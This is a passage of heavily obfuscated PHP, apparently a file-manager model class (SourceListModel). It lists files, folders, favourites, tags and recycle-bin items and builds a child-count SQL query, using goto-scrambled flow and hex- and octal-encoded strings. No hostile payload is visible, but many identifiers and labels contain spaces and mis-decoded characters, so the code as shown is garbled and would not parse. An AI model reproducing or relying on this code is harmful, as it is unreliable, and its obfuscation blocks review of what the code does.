($f¶Ò®µ¾Ëö) { $eİÎËÎÉÔ->where($C„åÎ‘ÛÒ£)->setField($cÈ¦Ÿ«†É[397], 1); $AÅäØ†Ô˜->eventRecycle($Fª¼·ùËß, $cÈ¦Ÿ«†É[2373]); } else { $bÅƒ¾‚“×Š = $eİÎËÎÉÔ->where($C„åÎ‘ÛÒ£)->find(); $bˆÖõŸÒé = $bÅƒ¾‚“×Š[$cÈ¦Ÿ«†É[370]] == $cÈ¦Ÿ«†É[83]; $EËé¤×±ƒí = $eİÎËÎÉÔ->fileNameAuto($bÅƒ¾‚“×Š[$cÈ¦Ÿ«†É[461]], $bÅƒ¾‚“×Š[$cÈ¦Ÿ«†É[28]], REPEAT_RENAME_FOLDER, $bˆÖõŸÒé); if ($EËé¤×±ƒí != $bÅƒ¾‚“×Š[$cÈ¦Ÿ«†É[28]]) { $eİÎËÎÉÔ->rename($Fª¼·ùËß, $EËé¤×±ƒí); } $eİÎËÎÉÔ->where($C„åÎ‘ÛÒ£)->setField($cÈ¦Ÿ«†É[397], 0); $AÅäØ†Ô˜->eventRecycle($Fª¼·ùËß, $cÈ¦Ÿ«†É[2374]); } } } goto dÜÕÕ•†Íƒ; e™—î¿¥œ: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\x72\143\145"; protected $tableMeta = array("\164\x61\142\154\x65\116\x61\x6d\x65" => "\x69\157\137\x73\x6f\165\162\143\145\137\x6d\145\x74\x61", "\155\x65\x74\141\x46\151\145\154\x64" => "\163\x6f\x75\x72\x63\145\111\104"); protected $dataAuto = array(array("\x6d\x6f\x64\151\x66\x79\x54\151\155\x65", "\164\x69\155\x65", "\x69\x6e\x73\145\162\164", "\146\x75\x6e\x63\164\x69\157\x6e"), array("\143\162\145\x61\x74\145\x54\151\x6d\x65", "\x74\151\x6d\x65", "\151\x6e\163\x65\162\164", "\146\x75\x6e\143\x74\151\157\x6e"), array("\x76\x69\145\167\x54\x69\155\x65", "\x74\151\x6d\x65", "\x69\156\x73\x65\x72\x74", "\x66\x75\x6e\x63\164\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($eÛğºçŠš) { return $this->listSource(array($_SERVER[¯Ò¬Èè][368] => $eÛğºçŠš)); } public function typeName($eƒÖç—Ãáó) { static $D—‚ø“òÖ = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\145\x6d", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\x67\x72\157\165\160"); return $D—‚ø“òÖ[$eƒÖç—Ãáó . $_SERVER[¯Ò¬Èè][33]]; } public function sourceListInfo($eíÎ­œĞ³†, $D¿ö¶ŒÈ˜“ = false) { goto E‡óƒµ’á; E‡óƒµ’á: $eƒ¹Û«ö Æ =& $_SERVER[¯Ò¬Èè]; $eíÎ­œĞ³† = $eíÎ­œĞ³† ? $eíÎ­œĞ³† : array(); $eíÎ­œĞ³† = array_filter(array_unique($eíÎ­œĞ³†)); goto cŒóÎ“ğçé; F÷µ˜÷Êë: return array_to_keyvalue($BîôìĞ¢Ó³, $eƒ¹Û«ö Æ[369]); goto fšì›˜µÌ“; cŒóÎ“ğçé: if (!$eíÎ­œĞ³†) { return array(); } $BîôìĞ¢Ó³ = $this->where(array($eƒ¹Û«ö Æ[369] => array($eƒ¹Û«ö Æ[7], $eíÎ­œĞ³†)))->select(); $this->_listDataApply($BîôìĞ¢Ó³, $D¿ö¶ŒÈ˜“); goto F÷µ˜÷Êë; fšì›˜µÌ“: } public function pathInfoFilter($C½„¥ê÷ÄÕ) { goto Fåç½­Ôøš; D¾äñ‡ë—: $C½„¥ê÷ÄÕ[$f‹£¦âŠÂº[371]] = $this->typeName($C½„¥ê÷ÄÕ[$f‹£¦âŠÂº[371]]); if ($C½„¥ê÷ÄÕ[$f‹£¦âŠÂº[370]] != 1) { $C½„¥ê÷ÄÕ[$f‹£¦âŠÂº[160]] = $C½„¥ê÷ÄÕ[$f‹£¦âŠÂº[372]]; unset($C½„¥ê÷ÄÕ[$f‹£¦âŠÂº[372]]); } $dƒµºÈ—®§ = $f‹£¦âŠÂº[373]; goto CÈÊƒ¨Ìõå; CÈÊƒ¨Ìõå: $dƒµºÈ—®§ .= $f‹£¦âŠÂº[374]; $dƒµºÈ—®§ .= $f‹£¦âŠÂº[375]; $CÊ…ëØÏº = explode($f‹£¦âŠÂº[47], $dƒµºÈ—®§); goto dë¢ƒë“¢í; Fåç½­Ôøš: $f‹£¦âŠÂº =& $_SERVER[¯Ò¬Èè]; $C½„¥ê÷ÄÕ[$f‹£¦âŠÂº[75]] = KodIO::make($C½„¥ê÷ÄÕ[$f‹£¦âŠÂº[369]]); $C½„¥ê÷ÄÕ[$f‹£¦âŠÂº[29]] = $C½„¥ê÷ÄÕ[$f‹£¦âŠÂº[370]] == 1 ? $f‹£¦âŠÂº[76] : $f‹£¦âŠÂº[167]; goto D¾äñ‡ë—; dë¢ƒë“¢í: if (isset($C½„¥ê÷ÄÕ[$f‹£¦âŠÂº[376]]) && $C½„¥ê÷ÄÕ[$f‹£¦âŠÂº[376]][$f‹£¦âŠÂº[377]] == -1) { $CÊ…ëØÏº = array_remove_value($CÊ…ëØÏº, $f‹£¦âŠÂº[187]); $CÊ…ëØÏº = array_remove_value($CÊ…ëØÏº, $f‹£¦âŠÂº[107]); $CÊ…ëØÏº = array_remove_value($CÊ…ëØÏº, $f‹£¦âŠÂº[378]); $CÊ…ëØÏº = array_remove_value($CÊ…ëØÏº, $f‹£¦âŠÂº[379]); $CÊ…ëØÏº = array_remove_value($CÊ…ëØÏº, $f‹£¦âŠÂº[77]); $CÊ…ëØÏº = array_remove_value($CÊ…ëØÏº, $f‹£¦âŠÂº[380]); } $C½„¥ê÷ÄÕ = array_field_key($C½„¥ê÷ÄÕ, $CÊ…ëØÏº); return $C½„¥ê÷ÄÕ; goto Aéè¯Çëƒê; Aéè¯Çëƒê: } public function listUserFav() { goto EØ¼¶çËñ‘; EØ¼¶çËñ‘: $cËµ¹¿ì˜ =& $_SERVER[¯Ò¬Èè]; $B³¸Ù´ĞÈ­ = Model($cËµ¹¿ì˜[381])->listData(); $Cï”åçÃ¿â = array_filter_by_field($B³¸Ù´ĞÈ­, $cËµ¹¿ì˜[29], $cËµ¹¿ì˜[382]); goto e‰ğğ‘¸î·; e‰ğğ‘¸î·: $Cï”åçÃ¿â = array_to_keyvalue($Cï”åçÃ¿â, $cËµ¹¿ì˜[33], $cËµ¹¿ì˜[75]); if ($Cï”åçÃ¿â) { $f¾¹š„¬»Ğ = $this->listSource(array($cËµ¹¿ì˜[383] => array($cËµ¹¿ì˜[384], $Cï”åçÃ¿â))); } $f¾¹š„¬»Ğ = array_to_keyvalue($f¾¹š„¬»Ğ[$cËµ¹¿ì˜[354]], $cËµ¹¿ì˜[369]); goto C÷‘Äá±»¯; C÷‘Äá±»¯: foreach ($B³¸Ù´ĞÈ­ as &$cäØìğªù´) { $cäØìğªù´ = array($cËµ¹¿ì˜[385] => $cäØìğªù´[$cËµ¹¿ì˜[367]], $cËµ¹¿ì˜[386] => $cäØìğªù´[$cËµ¹¿ì˜[28]], $cËµ¹¿ì˜[387] => $cäØìğªù´[$cËµ¹¿ì˜[75]], $cËµ¹¿ì˜[388] => $cäØìğªù´[$cËµ¹¿ì˜[29]], $cËµ¹¿ì˜[389] => $cäØìğªù´[$cËµ¹¿ì˜[187]], $cËµ¹¿ì˜[390] => $cäØìğªù´[$cËµ¹¿ì˜[107]]); if ($cäØìğªù´[$cËµ¹¿ì˜[29]] == $cËµ¹¿ì˜[382] && $f¾¹š„¬»Ğ[$cäØìğªù´[$cËµ¹¿ì˜[75]]]) { $cäØìğªù´[$cËµ¹¿ì˜[391]] = $f¾¹š„¬»Ğ[$cäØìğªù´[$cËµ¹¿ì˜[75]]]; } } return $B³¸Ù´ĞÈ­; goto Aò®ŸİÖ´Š; Aò®ŸİÖ´Š: } public function listUserTag($CÕº×‘ÁàÇ) { goto fŒÂ’…¤Ïï; eÇËƒ‘‚Šë: $c¾„¸›ÕÃ‚ = array_to_keyvalue($c¾„¸›ÕÃ‚, $eá«”ÜŒ¡‹[33], $eá«”ÜŒ¡‹[75]); $A¬ÏÒó»ø = array(); if ($c¾„¸›ÕÃ‚) { $d§¼Œ‹‚Ò¯ = array($eá«”ÜŒ¡‹[383] => array($eá«”ÜŒ¡‹[384], $c¾„¸›ÕÃ‚)); $A¬ÏÒó»ø = $this->listSource($d§¼Œ‹‚Ò¯); } goto FÚÄ×˜çÏâ; FÚÄ×˜çÏâ: $this->listUserTagClear($c¾„¸›ÕÃ‚, $A¬ÏÒó»ø, $CÕº×‘ÁàÇ); return $A¬ÏÒó»ø; goto CÜê¼Ã„á; fŒÂ’…¤Ïï: $eá«”ÜŒ¡‹ =& $_SERVER[¯Ò¬Èè]; $f·¨Ê—‚­‹ = Model($eá«”ÜŒ¡‹[392])->listData(); $c¾„¸›ÕÃ‚ = array_filter_by_field($f·¨Ê—‚­‹, $eá«”ÜŒ¡‹[393], $CÕº×‘ÁàÇ); goto eÇËƒ‘‚Šë; CÜê¼Ã„á: } private function listUserTagClear($cÙ‚‘òƒöì, $FèÊøËÑº, $AÁŸ‡ÑŒ½¬) { goto FÖ«½”Ò•ª; fõÀøášŒÚ: Model($b¼‡ÚÊ”[394])->removeFromTag($Bø‚ò¼íµ, $AÁŸ‡ÑŒ½¬); goto F‡æ¤Â«Š; dõ¢¢òõŸÂ: $cÌèç…ˆõ´ = array_merge($BŞœŸÄÔËÑ, $eŞøÂÓ±”·); foreach ($cÙ‚‘òƒöì as $cç¿ˆÍ„ë¦) { if (!in_array($cç¿ˆÍ„ë¦, $cÌèç…ˆõ´)) { $Bø‚ò¼íµ[] = $cç¿ˆÍ„ë¦; } } if (!$Bø‚ò¼íµ) { return; } goto fõÀøášŒÚ; FÖ«½”Ò•ª: $b¼‡ÚÊ” =& $_SERVER[¯Ò¬Èè]; if (!$cÙ‚‘òƒöì) { return; } if ($FèÊøËÑº && count($cÙ‚‘òƒöì) == $FèÊøËÑº[$b¼‡ÚÊ”[351]][$b¼‡ÚÊ”[352]]) { return; } goto Fµ¤Î‘„òÌ; Fµ¤Î‘„òÌ: $Bø‚ò¼íµ = array(); $eŞøÂÓ±”· = array_to_keyvalue($FèÊøËÑº[$b¼‡ÚÊ”[74]], $b¼‡ÚÊ”[33], $b¼‡ÚÊ”[369]); $BŞœŸÄÔËÑ = array_to_keyvalue($FèÊøËÑº[$b¼‡ÚÊ”[73]], $b¼‡ÚÊ”[33], $b¼‡ÚÊ”[369]); goto dõ¢¢òõŸÂ; F‡æ¤Â«Š: } public function listUserRecycle() { $D«÷·œ´ =& $_SERVER[¯Ò¬Èè]; $b‰‘ÜÈò¹Ï = Model($D«÷·œ´[395])->listData(); if (!$b‰‘ÜÈò¹Ï) { return array(); } $e…‚¸œì = array($D«÷·œ´[383] => array($D«÷·œ´[384], $b‰‘ÜÈò¹Ï), $D«÷·œ´[396] => 1); return $this->listSource($e…‚¸œì); } public function listSource($CÅĞ¥šÁŠÎ, $DóÁò¼è‡­ = 3000) { goto AáØÇæà‹; E¤ìÌÆ·šÅ: return $DŒ–¢£‚Ó‡; goto f»’³… ; AìšÅø: $DŒ–¢£‚Ó‡ = $this->field($c‹ãçÅ§Úê)->_makeOrder()->where($CÅĞ¥šÁŠÎ)->selectPage($DóÁò¼è‡­); $this->_listDataApply($DŒ–¢£‚Ó‡[$BÇ¦Á›Ÿ[354]]); $this->_listMake($DŒ–¢£‚Ó‡); goto E¤ìÌÆ·šÅ; AáØÇæà‹: $BÇ¦Á›Ÿ =& $_SERVER[¯Ò¬Èè]; if (!isset($CÅĞ¥šÁŠÎ[$BÇ¦Á›Ÿ[397]])) { $CÅĞ¥šÁŠÎ[$BÇ¦Á›Ÿ[397]] = 0; } $c‹ãçÅ§Úê = $BÇ¦Á›Ÿ[398]; goto AìšÅø; f»’³… : } protected function _makeOrder() { goto c´™Æ†¬¨Ş; cŸµ§çô˜•: $D“—²Ë¼ã = array($d®µ¤àœ»[402] => $d®µ¤àœ»[403], $d®µ¤àœ»[404] => $d®µ¤àœ»[405]); $AøÕÛÎ³ì× = array($d®µ¤àœ»[28] => $d®µ¤àœ»[28], $d®µ¤àœ»[77] => $d®µ¤àœ»[77], $d®µ¤àœ»[160] => $d®µ¤àœ»[372], $d®µ¤àœ»[378] => $d®µ¤àœ»[378], $d®µ¤àœ»[406] => $d®µ¤àœ»[379], $d®µ¤àœ»[187] => $d®µ¤àœ»[187], $d®µ¤àœ»[107] => $d®µ¤àœ»[107]); $eİãÎóÄóæ = Input::get($d®µ¤àœ»[407], $d®µ¤àœ»[7], $a‰ä®ÓŒ, array_keys($AøÕÛÎ³ì×)); goto eÂ”ØîÉ¤­; c´™Æ†¬¨Ş: $d®µ¤àœ» =& $_SERVER[¯Ò¬Èè]; $a‰ä®ÓŒ = Model($d®µ¤àœ»[399])->get($d®µ¤àœ»[400]); $cŸ·è†ìè¼ = Model($d®µ¤àœ»[399])->get($d®µ¤àœ»[401]); goto cŸµ§çô˜•; eÂ”ØîÉ¤­: $a¨Ñ´„–Éä = Input::get($d®µ¤àœ»[408], $d®µ¤àœ»[7], $cŸ·è†ìè¼, array_keys($D“—²Ë¼ã)); if (!in_array($eİãÎóÄóæ, array_keys($AøÕÛÎ³ì×))) { $eİãÎóÄóæ = $d®µ¤àœ»[28]; } if (!in_array($a¨Ñ´„–Éä, array_keys($D“—²Ë¼ã))) { $eİãÎóÄóæ = $d®µ¤àœ»[402]; } goto d²öé ÷Ô¯; d²öé ÷Ô¯: if ($eİãÎóÄóæ == $d®µ¤àœ»[28]) { } $fÚÍË™¶°á = $d®µ¤àœ»[409] . $AøÕÛÎ³ì×[$eİãÎóÄóæ] . $d®µ¤àœ»[50] . $D“—²Ë¼ã[$a¨Ñ´„–Éä]; return $this->order(rtrim(trim($fÚÍË™¶°á), $d®µ¤àœ»[47])); goto d‡…‘µì‰Ò; d‡…‘µì‰Ò: } protected function _listDataApplyItem($eùœ‹íšºó, $B«©¢Ìè¶Æ = false) { $aÅŞ¢íù¯ = array($eùœ‹íšºó); $this->_listDataApply($aÅŞ¢íù¯, $B«©¢Ìè¶Æ); return $aÅŞ¢íù¯[0]; } protected function _listDataApply(&$e ‹ùÓ¸¾, $dœª×œŸº = false) { goto c¡‹ŒÛàªë; c¡‹ŒÛàªë: $Aß”‰ îÄ =& $_SERVER[¯Ò¬Èè]; if (!$e ‹ùÓ¸¾) { $e ‹ùÓ¸¾ = array(); return; } $a”·Î§‘µ = array_to_keyvalue($e ‹ùÓ¸¾, $Aß”‰ îÄ[33], $Aß”‰ îÄ[369]); goto CÄè†ê¥¼; A‚Ÿ†ÑÂß›: $this->_listAppendUser($e ‹ùÓ¸¾); $this->_listFilterInfo($e ‹ùÓ¸¾, $dœª×œŸº); goto B”é©òá¼ò; F¹ïˆ÷‹ˆô: $this->_listAppendPath($e ‹ùÓ¸¾); $this->_listAppendAuth($e ‹ùÓ¸¾); $this->_listAppendSourceInfo($e ‹ùÓ¸¾, $a”·Î§‘µ); goto A‚Ÿ†ÑÂß›; CÄè†ê¥¼: $a”·Î§‘µ = array_unique($a”·Î§‘µ); $this->_listSourceCache($e ‹ùÓ¸¾); if (!$dœª×œŸº) { $this->_listAppendMeta($e ‹ùÓ¸¾, $a”·Î§‘µ); $this->_listAppendFileMeta($e ‹ùÓ¸¾, $a”·Î§‘µ); $this->_listAppendChildren($e ‹ùÓ¸¾, $a”·Î§‘µ); } goto F¹ïˆ÷‹ˆô; B”é©òá¼ò: } protected function _listSourceCache($E¶†“²¬‚Ë) { $d×ÅÒ¬´¤ =& $_SERVER[¯Ò¬Èè]; foreach ($E¶†“²¬‚Ë as $bğğÎÂùĞ¼) { self::$cacheSourceInfo[$d×ÅÒ¬´¤[410] . $bğğÎÂùĞ¼[$d×ÅÒ¬´¤[369]]] = $bğğÎÂùĞ¼; } } protected function _listFilterInfo(&$e÷İŞ«, $CÀ–´±Ü÷ = false) { $E’à™Ä…ñ„ =& $_SERVER[¯Ò¬Èè]; foreach ($e÷İŞ« as &$eŠàŠã ‡³) { $eŠàŠã ‡³ = $this->pathInfoFilter($eŠàŠã ‡³); self::$cachePathInfo[$E’à™Ä…ñ„[411] . intval($CÀ–´±Ü÷) . $E’à™Ä…ñ„[412] . $eŠàŠã ‡³[$E’à™Ä…ñ„[369]]] = $eŠàŠã ‡³; } } protected function _listMake(&$Bï®ã¨Ÿ’) { $e©‘¤ñ§Œë =& $_SERVER[¯Ò¬Èè]; $Bï®ã¨Ÿ’[$e©‘¤ñ§Œë[74]] = array(); $Bï®ã¨Ÿ’[$e©‘¤ñ§Œë[73]] = array(); foreach ($Bï®ã¨Ÿ’[$e©‘¤ñ§Œë[354]] as $DëÆñ½¥¤Ş) { $dß×ÏˆëÛ = $DëÆñ½¥¤Ş[$e©‘¤ñ§Œë[370]] == 1 ? $e©‘¤ñ§Œë[74] : $e©‘¤ñ§Œë[73]; $Bï®ã¨Ÿ’[$dß×ÏˆëÛ][] = $DëÆñ½¥¤Ş; } unset($Bï®ã¨Ÿ’[$e©‘¤ñ§Œë[354]]); } protected function _listAppendMeta(&$dîÓ¼‡÷º”, $eÈğè¤Úø) { goto c×ùë´Ôˆ¤; E²Š‹øİø±: if (!$cˆğÀÚñ•«) { return; } $dùÜ«›ìŠ§ = array($e¬‹ĞÅË§®[415], $e¬‹ĞÅË§®[416]); $c²õêõ¤õ˜ = array(); goto c©èÜÌò¿°; c©èÜÌò¿°: foreach ($cˆğÀÚñ•« as $eã…õ´äá) { if (!isset($c²õêõ¤õ˜[$eã…õ´äá[$e¬‹ĞÅË§®[369]]])) { $c²õêõ¤õ˜[$eã…õ´äá[$e¬‹ĞÅË§®[369]]] = array(); } if (in_array($eã…õ´äá[$e¬‹ĞÅË§®[89]], $dùÜ«›ìŠ§)) { continue; } $c²õêõ¤õ˜[$eã…õ´äá[$e¬‹ĞÅË§®[369]]][$eã…õ´äá[$e¬‹ĞÅË§®[89]]] = $eã…õ´äá[$e¬‹ĞÅË§®[359]]; } foreach ($dîÓ¼‡÷º” as &$C÷âÂëù‚’) { $C÷âÂëù‚’[$e¬‹ĞÅË§®[417]] = !1; if (isset($c²õêõ¤õ˜[$C÷âÂëù‚’[$e¬‹ĞÅË§®[369]]])) { $C÷âÂëù‚’[$e¬‹ĞÅË§®[417]] = $c²õêõ¤õ˜[$C÷âÂëù‚’[$e¬‹ĞÅË§®[369]]]; } if ($this->fileIsLock($C÷âÂëù‚’) && $C÷âÂëù‚’[$e¬‹ĞÅË§®[376]]) { $d‚ß³ÚÉÚ³ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $C÷âÂëù‚’[$e¬‹ĞÅË§®[376]][$e¬‹ĞÅË§®[377]] = AuthModel::authDisable($C÷âÂëù‚’[$e¬‹ĞÅË§®[376]][$e¬‹ĞÅË§®[377]], $d‚ß³ÚÉÚ³); $C÷âÂëù‚’[$e¬‹ĞÅË§®[376]][$e¬‹ĞÅË§®[418]][$e¬‹ĞÅË§®[376]] = $C÷âÂëù‚’[$e¬‹ĞÅË§®[376]][$e¬‹ĞÅË§®[377]]; } } goto A¹¢ÚØ÷§; c×ùë´Ôˆ¤: $e¬‹ĞÅË§® =& $_SERVER[¯Ò¬Èè]; $AÅ’Û˜Î¹Æ = array($e¬‹ĞÅË§®[383] => array($e¬‹ĞÅË§®[384], $eÈğè¤Úø)); $cˆğÀÚñ•« = Model($e¬‹ĞÅË§®[413])->field($e¬‹ĞÅË§®[414])->where($AÅ’Û˜Î¹Æ)->select(); goto E²Š‹øİø±; A¹¢ÚØ÷§: } protected function _listAppendFileMeta(&$FŠˆ§Ã“Ó, $f¥¬Û›¼å) { goto f¾ó¬Ñ¢·; Bæ¥Á‚ªÇ: $eã‚…„á‚Ä = Model($Fó†ïœç÷›[422])->field($C•ƒíÙ¼ò¡)->where($b½©ÚĞÁø¼)->select(); $eã‚…„á‚Ä = array_to_keyvalue($eã‚…„á‚Ä, $Fó†ïœç÷›[419]); $Eâ¬î±™Ï = Model($Fó†ïœç÷›[423])->field($Fó†ïœç÷›[424])->where($b½©ÚĞÁø¼)->select(); goto fæ¹¼Êé÷¦; d«Ó©ƒ°©í: foreach ($FŠˆ§Ã“Ó as &$d»¦ë•ºİñ) { goto DºˆõÀ¢³¢; dÛÈÅ¿ßä: $eôŠÈßÆ‚¡[$Fó†ïœç÷›[77]] = $d»¦ë•ºİñ[$Fó†ïœç÷›[77]]; $eôŠÈßÆ‚¡[$Fó†ïœç÷›[28]] = $d»¦ë•ºİñ[$Fó†ïœç÷›[28]]; self::$cacheFileInfo[$Fó†ïœç÷›[425] . $dãÓ—ÄñÑ‡] = $eôŠÈßÆ‚¡; goto A†¼®†„Öî; DºˆõÀ¢³¢: $dãÓ—ÄñÑ‡ = $d»¦ë•ºİñ[$Fó†ïœç÷›[419]]; if (!$dãÓ—ÄñÑ‡ || !isset($eã‚…„á‚Ä[$dãÓ—ÄñÑ‡])) { continue; } $eôŠÈßÆ‚¡ = $eã‚…„á‚Ä[$dãÓ—ÄñÑ‡]; goto dÛÈÅ¿ßä; A†¼®†„Öî: unset($eã‚…„á‚Ä[$dãÓ—ÄñÑ‡][$Fó†ïœç÷›[75]]); $Fä„Ûß“´ = is_array($C²İ£ÕÃõ¤[$dãÓ—ÄñÑ‡]) ? $C²İ£ÕÃõ¤[$dãÓ—ÄñÑ‡] : array(); $d»¦ë•ºİñ[$Fó†ïœç÷›[162]] = array_merge($Fä„Ûß“´, $eã‚…„á‚Ä[$dãÓ—ÄñÑ‡]); goto Cå¦‹ÆÓŞ; Cå¦‹ÆÓŞ: if (isset($d»¦ë•ºİñ[$Fó†ïœç÷›[162]][$Fó†ïœç÷›[426]])) { $d»¦ë•ºİñ[$Fó†ïœç÷›[426]] = json_decode($d»¦ë•ºİñ[$Fó†ïœç÷›[162]][$Fó†ïœç÷›[426]], !0); unset($d»¦ë•ºİñ[$Fó†ïœç÷›[162]][$Fó†ïœç÷›[426]]); } goto Böº¾ÎËºË; Böº¾ÎËºË: } goto e’×µ¥Ç´; fó‚ßòïçœ: if (!$FªàêÆ²Š) { return; } $b½©ÚĞÁø¼ = array($Fó†ïœç÷›[420] => array($Fó†ïœç÷›[384], $FªàêÆ²Š)); $C•ƒíÙ¼ò¡ = $Fó†ïœç÷›[421]; goto Bæ¥Á‚ªÇ; fæ¹¼Êé÷¦: $Eâ¬î±™Ï = $Eâ¬î±™Ï ? $Eâ¬î±™Ï : array(); $C²İ£ÕÃõ¤ = array(); foreach ($Eâ¬î±™Ï as $bºİÅŠÏ¨) { if (!isset($C²İ£ÕÃõ¤[$bºİÅŠÏ¨[$Fó†ïœç÷›[419]]])) { $C²İ£ÕÃõ¤[$bºİÅŠÏ¨[$Fó†ïœç÷›[419]]] = array(); } $C²İ£ÕÃõ¤[$bºİÅŠÏ¨[$Fó†ïœç÷›[419]]][$bºİÅŠÏ¨[$Fó†ïœç÷›[89]]] = $bºİÅŠÏ¨[$Fó†ïœç÷›[359]]; } goto d«Ó©ƒ°©í; f¾ó¬Ñ¢·: $Fó†ïœç÷› =& $_SERVER[¯Ò¬Èè]; $FªàêÆ²Š = array_to_keyvalue($FŠˆ§Ã“Ó, $Fó†ïœç÷›[33], $Fó†ïœç÷›[419]); $FªàêÆ²Š = array_filter(array_unique($FªàêÆ²Š)); goto fó‚ßòïçœ; e’×µ¥Ç´: } protected function _listAppendSourceInfo(&$f¸ÙŠÅÍÔ, $Aè–Œ†¼Ê) { goto AùÑ÷›»; aèâî‡Âàƒ: $FÖŒ´ĞˆÏ¨ = array_to_keyvalue_group($cÈğ•Öß§, $bïìÌŒ®[369]); foreach ($f¸ÙŠÅÍÔ as &$cŠËğ¹èÂ˜) { $cŠËğ¹èÂ˜[$bïìÌŒ®[391]] = array($bïìÌŒ®[430] => 0, $bïìÌŒ®[431] => 0, $bïìÌŒ®[432] => 0); if (isset($DÖó˜É ‚‰[$cŠËğ¹èÂ˜[$bïìÌŒ®[369]]])) { $cŠËğ¹èÂ˜[$bïìÌŒ®[391]][$bïìÌŒ®[433]] = 1; $cŠËğ¹èÂ˜[$bïìÌŒ®[391]][$bïìÌŒ®[434]] = $DÖó˜É ‚‰[$cŠËğ¹èÂ˜[$bïìÌŒ®[369]]][$bïìÌŒ®[28]]; } if (isset($bí²À¹áïå[$cŠËğ¹èÂ˜[$bïìÌŒ®[369]]])) { $cŠËğ¹èÂ˜[$bïìÌŒ®[391]][$bïìÌŒ®[435]] = array(); foreach ($bí²À¹áïå[$cŠËğ¹èÂ˜[$bïìÌŒ®[369]]] as $C‰ñ–‰ƒß) { $eÍÒÖ‚Ü = $FæŞÚ°†Ó[$C‰ñ–‰ƒß]; $cŠËğ¹èÂ˜[$bïìÌŒ®[391]][$bïìÌŒ®[435]][] = array($bïìÌŒ®[436] => $eÍÒÖ‚Ü[$bïìÌŒ®[367]], $bïìÌŒ®[386] => $eÍÒÖ‚Ü[$bïìÌŒ®[28]], $bïìÌŒ®[437] => $eÍÒÖ‚Ü[$bïìÌŒ®[438]]); } } if (isset($FÖŒ´ĞˆÏ¨[$cŠËğ¹èÂ˜[$bïìÌŒ®[369]]])) { $cŠËğ¹èÂ˜[$bïìÌŒ®[391]][$bïìÌŒ®[439]] = array(); foreach ($FÖŒ´ĞˆÏ¨[$cŠËğ¹èÂ˜[$bïìÌŒ®[369]]] as $f§á²ßÔ¼) { $cŠËğ¹èÂ˜[$bïìÌŒ®[391]][$bïìÌŒ®[439]] = array($bïìÌŒ®[440] => $f§á²ßÔ¼[$bïìÌŒ®[441]], $bïìÌŒ®[442] => $f§á²ßÔ¼[$bïìÌŒ®[443]], $bïìÌŒ®[444] => $f§á²ßÔ¼[$bïìÌŒ®[369]], $bïìÌŒ®[445] => $f§á²ßÔ¼[$bïìÌŒ®[446]], $bïìÌŒ®[447] => $f§á²ßÔ¼[$bïìÌŒ®[448]]); } } } return $f¸ÙŠÅÍÔ; goto c©ÃµæŠñ®; AùÑ÷›»: $bïìÌŒ® =& $_SERVER[¯Ò¬Èè]; if (!defined($bïìÌŒ®[427])) { return; } $eê§Ê˜Ó´á = Model($bïìÌŒ®[428])->listData(); goto aÉ£ºˆ£ƒ¦; AÁ¸»ŒÜ•¶: $FæŞÚ°†Ó = array_to_keyvalue($eê§Ê˜Ó´á, $bïìÌŒ®[367]); $bí²À¹áïå = array_to_keyvalue_group($A—ç“ù‚Œ“, $bïìÌŒ®[75], $bïìÌŒ®[393]); $DÖó˜É ‚‰ = array_to_keyvalue($a²Î™­†ÒÎ, $bïìÌŒ®[75]); goto aèâî‡Âàƒ; aÉ£ºˆ£ƒ¦: $A—ç“ù‚Œ“ = Model($bïìÌŒ®[392])->listData(); $a²Î™­†ÒÎ = Model($bïìÌŒ®[381])->listData(); $cÈğ•Öß§ = Model($bïìÌŒ®[429])->listSimple(); goto AÁ¸»ŒÜ•¶; c©ÃµæŠñ®: } protected function _listAppendChildren(&$EÍÚ£âï…ë, $aŠÇ¿ßÔ“ñ) { goto D‘ëÈÊ¤ğ; Däİˆ¯Çõ: $Bó«–¹ğ¶Ç = $this->tablePrefix . $this->tableName; for ($Cèä¸¦…‡¦ = 0; $Cèä¸¦…‡¦ < $Eô¿«©³ãˆ; $Cèä¸¦…‡¦++) { $FƒÓ®à„Ñ™ = intval($EÍÚ£âï…ë[$Cèä¸¦…‡¦][$cÔ¼ïëÈ†[397]]); if ($EÍÚ£âï…ë[$Cèä¸¦…‡¦][$cÔ¼ïëÈ†[370]]) { $fŞ›ÏÚ¿­ = $EÍÚ£âï…ë[$Cèä¸¦…‡¦][$cÔ¼ïëÈ†[369]]; $Fö‘İ÷Å­ .= "\x53\105\114\x45\103\124\40\x2a\40\x46\122\117\x4d\x20\50\x53\x45\x4c\105\x43\x54\40\x27{$fŞ›ÏÚ¿­}\x5f\150\x61\163\x46\151\x6c\x65\47\x20\141\163\x20\x68\x61\x73\x2c\x63\x6f\x75\x6e\x74\50\x31\51\x20\x61\x73\x20\150\x61\x73\103\x6f\x75\x6e\x74\x20\106\122\x4f\x4d\x20\x60{$Bó«–¹ğ¶Ç}\140\x20\xa\11\x9\11\x9\11\167\x68\145\x72\x65\40\x70\x61\162\x65\156\164\x49\x44\x3d{$fŞ›ÏÚ¿­}\40\x61\x6e\x64\40\151\x73\x46\157\x6c\x64\145\162\75\60\40\x61\156\x64\40\151\163\x44\x65\x6c\145\164\145\75{$FƒÓ®à„Ñ™}\x29\40\141\163\x20\x74\142\x31\x5f{$fŞ›ÏÚ¿­}\x20\165\156\x69\157\156\x20\x61\x6c\154\40\xa\11\11\x9\11\11\x53\105\114\x45\x43\124\40\x2a\x20\x46\x52\117\x4d\x20\50\x53\105\x4c\105\x43\124\40\x27{$fŞ›ÏÚ¿­}\x5f\150\141\x73\x46\x6f\x6c\x64\x65\x72\x27\40\x61\x73\40\150\141\163\x46\151\x6c\x65\x2c\x63\x6f\x75\x6e\x74\x28\x31\x29\x20\x61\163\40\150\x61\x73\x43\x6f\x75\156\164\40\106\122\x4f\x4d\40\x60{$Bó«–¹ğ¶Ç}\140\x20\xa\x9\11\x9\11\x9\x77\x68\145\x72\145\40\160\x61\162\145\156\x74\111\x44\75{$fŞ›ÏÚ¿­}\x20\x61\x6e\x64\x20\x69\163\x46\x6f\x6c\x64\x65\x72\x3d\61\40\x61\x6e\x64\x20\x69\163\x44\x65\x6c\145\164\x65\x3d{$FƒÓ®à„Ñ™}\x29\40\x61\163\40\x